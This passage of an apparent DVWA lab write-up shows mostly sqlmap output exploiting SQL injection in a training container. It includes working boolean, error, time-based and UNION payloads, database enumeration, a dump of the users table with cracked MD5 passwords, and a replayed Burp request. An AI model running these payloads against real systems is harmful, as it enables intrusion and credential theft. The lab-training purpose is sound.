|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:40:29 /2023-12-01/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] 
[13:40:31] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:40:31] [INFO] testing connection to the target URL
[13:40:31] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:40:31] [INFO] testing if the target URL content is stable
[13:40:32] [INFO] target URL content is stable
[13:40:32] [INFO] testing if URI parameter '#1*' is dynamic
[13:40:32] [WARNING] URI parameter '#1*' does not appear to be dynamic
[13:40:32] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[13:40:32] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[13:40:32] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[13:40:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:40:35] [WARNING] reflective value(s) found and filtering out
[13:40:35] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:40:35] [INFO] testing 'Generic inline queries'
[13:40:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:40:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:40:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:40:35] [INFO] URI parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
[13:40:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:40:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:40:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:40:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:40:35] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:40:35] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:40:35] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:40:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:40:35] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:40:35] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:40:35] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:40:35] [INFO] testing 'MySQL inline queries'
[13:40:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:40:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:40:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:40:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:40:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:40:35] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:40:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:40:45] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:40:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:40:45] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:40:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:40:45] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:40:45] [INFO] target URL appears to have 2 columns in query
[13:40:46] [INFO] URI parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[13:40:46] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 138 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR NOT 4697=4697#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR (SELECT 1636 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(1636=1636,1))),0x717a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ytEF&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' AND (SELECT 1382 FROM (SELECT(SLEEP(5)))dEuN)-- TVzy&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' UNION ALL SELECT CONCAT(0x7176707671,0x7853497561634f616d655a55687979796c716d616274684c417058576a5664656a6d45426557686e,0x717a7a6a71),NULL#&Submit=Submit
---
[13:40:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
```
SI añadimos flags podemos hacer más cosas, tales como obtener mas información relativa a la base de datos con el flag `-dbs`

```txt
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:41:53 /2023-12-01/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[13:41:53] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:41:53] [INFO] resuming back-end DBMS 'mysql' 
[13:41:53] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR NOT 4697=4697#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR (SELECT 1636 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(1636=1636,1))),0x717a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ytEF&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' AND (SELECT 1382 FROM (SELECT(SLEEP(5)))dEuN)-- TVzy&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' UNION ALL SELECT CONCAT(0x7176707671,0x7853497561634f616d655a55687979796c716d616274684c417058576a5664656a6d45426557686e,0x717a7a6a71),NULL#&Submit=Submit
---
[13:41:53] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:41:53] [INFO] fetching database names
[13:41:53] [WARNING] reflective value(s) found and filtering out
available databases [2]:
[*] dvwa
[*] information_schema

```
We can select one of the databases that contains the database and list its tables with the following flags `-D dvwa --tables`

```txt
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:45:26 /2023-12-01/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[13:45:26] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:45:26] [INFO] resuming back-end DBMS 'mysql' 
[13:45:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR NOT 4697=4697#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR (SELECT 1636 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(1636=1636,1))),0x717a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ytEF&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' AND (SELECT 1382 FROM (SELECT(SLEEP(5)))dEuN)-- TVzy&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' UNION ALL SELECT CONCAT(0x7176707671,0x7853497561634f616d655a55687979796c716d616274684c417058576a5664656a6d45426557686e,0x717a7a6a71),NULL#&Submit=Submit
---
[13:45:26] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:45:26] [INFO] fetching tables for database: 'dvwa'
[13:45:26] [WARNING] reflective value(s) found and filtering out
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
```
We can list the columns of a specific table by means of `-D dvwa -T users --columns`
```txt
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.12#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:46:37 /2023-12-01/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[13:46:37] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:46:37] [INFO] resuming back-end DBMS 'mysql' 
[13:46:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR NOT 4697=4697#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR (SELECT 1636 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(1636=1636,1))),0x717a7a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ytEF&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' AND (SELECT 1382 FROM (SELECT(SLEEP(5)))dEuN)-- TVzy&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' UNION ALL SELECT CONCAT(0x7176707671,0x7853497561634f616d655a55687979796c716d616274684c417058576a5664656a6d45426557686e,0x717a7a6a71),NULL#&Submit=Submit
---
[13:46:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:46:37] [INFO] fetching columns for table 'users' in database 'dvwa'
[13:46:37] [WARNING] reflective value(s) found and filtering out
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
```
Finally, we can list the contents of the columns of a specific table (and "decode" the hashes associated with the contents of these columns), for this purpose `-D dvwa -T users -C user,password --dump`

```txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.6.12#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:48:40 /2023-12-01/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[13:48:40] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[13:48:40] [INFO] testing connection to the target URL
[13:48:40] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:48:40] [INFO] testing if the target URL content is stable
[13:48:41] [INFO] target URL content is stable
[13:48:41] [INFO] testing if URI parameter '#1*' is dynamic
[13:48:41] [WARNING] URI parameter '#1*' does not appear to be dynamic
[13:48:41] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[13:48:41] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[13:48:41] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:48:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:48:41] [WARNING] reflective value(s) found and filtering out
[13:48:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:48:41] [INFO] testing 'Generic inline queries'
[13:48:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:48:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[13:48:42] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[13:48:42] [INFO] URI parameter '#1*' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --not-string="Me")
[13:48:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:48:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:48:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:48:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:48:42] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:48:42] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:48:42] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:48:42] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:48:42] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:48:42] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:48:42] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:48:42] [INFO] testing 'MySQL inline queries'
[13:48:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:48:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:48:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:48:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:48:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:48:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:48:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:48:52] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:48:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:48:52] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[13:48:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:48:52] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:48:52] [INFO] target URL appears to have 2 columns in query
[13:48:52] [INFO] URI parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[13:48:52] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 138 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR NOT 3699=3699#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' OR (SELECT 3256 FROM(SELECT COUNT(*),CONCAT(0x7176707671,(SELECT (ELT(3256=3256,1))),0x716b707871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Dqos&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' AND (SELECT 9449 FROM (SELECT(SLEEP(5)))EHKh)-- hqAA&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: http://172.17.0.2:80/vulnerabilities/sqli/?id=' UNION ALL SELECT CONCAT(0x7176707671,0x7564654c4b4772796379614c7763464641754e7352476444795249595949734d6d7a4f77686c7954,0x716b707871),NULL#&Submit=Submit
---
[13:48:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[13:48:52] [INFO] fetching entries of column(s) '`user`,password' for table 'users' in database 'dvwa'
[13:48:52] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[13:48:52] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[13:48:52] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[13:48:52] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:48:52] [INFO] starting 4 processes 
[13:48:56] [INFO] cracked password 'abc123' for hash 'e99a18c428cb38d5f260853678922e03'                                                                                                      
[13:48:57] [INFO] cracked password 'charley' for hash '8d3533d75ae2c3966d7e0d4fcc69216b'                                                                                                     
[13:49:01] [INFO] cracked password 'letmein' for hash '0d107d09f5bbe40cade3de5c71e9e9b7'                                                                                                     
[13:49:02] [INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'                                                                                                    
Database: dvwa                                                                                                                                                                               
Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
```

Despite having managed to exploit the vulnerability with this automatic tool, it is worth mentioning that it can be done manually, for this there are lists of queries for each type of database.

\*Here we take advantage of the fact that we already know the database from the previous steps, but if not, we should try with the different types of databases until we get it right.

Concretely we can find the necessary queries here: https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MySQL%20Injection/

For example to obtain the list of users we use the query `' OR '1`.

```txt
ID: ' OR '1  
First name: admin  
Surname: admin

ID: ' OR '1  
First name: Gordon  
Surname: Brown

ID: ' OR '1  
First name: Hack  
Surname: Me

ID: ' OR '1  
First name: Pablo  
Surname: Picasso

ID: ' OR '1  
First name: Bob  
Surname: Smith
```

#### Normal

As always we check if the above procedure works and as most of the time it doesn't. We decide to save the request so as previously done we open Burpsuite and start Burp Suite Toogler addon.
We decide to save the request so as previously done we open Burpsuite and start the Burp Suite Toogler addon.

We generate a basic query request and send it. Now we have in the intercept tab inside burpsuite the query so we export this as `.txt`.

The content is as follows:

```txt
POST /vulnerabilities/sqli/ HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.17.0.2/vulnerabilities/sqli/
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://172.17.0.2
DNT: 1
Connection: close
Cookie: PHPSESSID=albq3dhv4vof90l6l89q8qa1s0; security=medium
Upgrade-Insecure-Requests: 1

id=1&Submit=Submit
```

The tool is prepared to accept this type of files as input since they contain everything necessary to perform the attack. We simply run `sqlmap -r a -dbs`.
\* `a` is the name of the file in which we have saved the request.

```txt
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.12#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:10:40 /2023-12-02/

[13:10:40] [INFO] parsing HTTP request from 'a'
[13:10:40] [INFO] testing connection to the target URL
[13:10:40] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[13:10:40] [INFO] testing if the target URL content is stable
[13:10:41] [INFO] target URL content is stable
[13:10:41] [INFO] testing if POST parameter 'id' is dynamic
[13:10:41] [WARNING] POST parameter 'id' does not appear to be dynamic
[13:10:41] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[13:10:41] [INFO] testing for SQL injection on POST parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[13:10:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:10:47] [WARNING] reflective value(s) found and filtering out
[13:10:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[13:10:48] [INFO] POST parameter 'id' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --string="DB")
[13:10:48] [INFO] testing 'Generic inline queries'
[13:10:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:10:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:10:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:10:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:10:48] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[13:10:48] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[13:10:48] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:10:48] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:10:48] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:10:48] [INFO] POST parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[13:10:48] [INFO] testing 'MySQL inline queries'
[13:10:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[13:10:48] [WARNING] time-based comparison requires larger statistical model, please wait. (done)                                                                                            
[13:10:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[13:10:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[13:10:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[13:10:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[13:10:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[13:10:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[13:10:58] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[13:10:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:10:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:10:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:10:58] [INFO] target URL appears to have 2 columns in query
[13:10:58] [INFO] POST parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: id=(SELECT (CASE WHEN (3745=3745) THEN 1 ELSE (SELECT 8799 UNION SELECT 2604) END))&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 3625 FROM(SELECT COUNT(*),CONCAT(0x7171787871,(SELECT (ELT(3625=3625,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 8632 FROM (SELECT(SLEEP(5)))uRpz)&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x7171787871,0x7070625443514a4a74615a426e614e4256626b5742636b64675359505a4a477a70455a5444754162,0x7178707071)-- -&Submit=Submit
---
[13:12:41] [INFO] the back-end DBMS is MySQL
[13:12:41] [CRITICAL] unable to connect to the target URL ('Broken pipe'). sqlmap is going to retry the request(s)
web server operating system: Linux Debian 9 (stretch)
